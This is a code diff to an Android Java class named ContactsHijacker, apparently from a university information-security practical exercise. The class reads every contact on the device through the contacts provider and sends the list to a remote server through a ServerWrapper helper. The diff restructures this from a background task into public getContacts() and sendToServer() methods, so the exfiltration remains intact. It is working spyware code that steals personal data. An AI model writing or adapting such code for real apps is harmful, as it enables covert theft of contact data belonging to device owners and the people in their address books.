@@ -5,6 +5,7 @@ package com.seginfo.tp.seginfotp;
  */
 import android.app.Activity;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.database.Cursor;
 import android.os.AsyncTask;
 import android.provider.ContactsContract;
@@ -13,21 +14,18 @@ import android.widget.Toast;
 
 import java.util.ArrayList;
 
-public class ContactsHijacker extends AsyncTask<Activity, Void, Integer> {
+public class ContactsHijacker {
 
-    Activity _act;
+    private Context _context;
 
-    @Override
-    protected Integer doInBackground(Activity... args) {
-        _act = args[0];
-        ServerWrapper.send_contacts(obtain_contacts());
-        return 0;
+    public ContactsHijacker(Context context){
+        _context = context;
     }
 
-    private ArrayList<Contact> obtain_contacts() {
+    public ArrayList<Contact> getContacts() {
         ArrayList<Contact> contacts = new ArrayList<Contact>();
         Log.i("ContactsHijacker", "obtaining contacts");
-        ContentResolver cr = _act.getContentResolver();
+        ContentResolver cr = _context.getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
         if (cur.getCount() > 0) {
@@ -53,6 +51,10 @@ public class ContactsHijacker extends AsyncTask<Activity, Void, Integer> {
         }
         cur.close();
         return contacts;
+    }
+
+    public void sendToServer(){
+        ServerWrapper.send_contacts(getContacts());
     }
 }
 
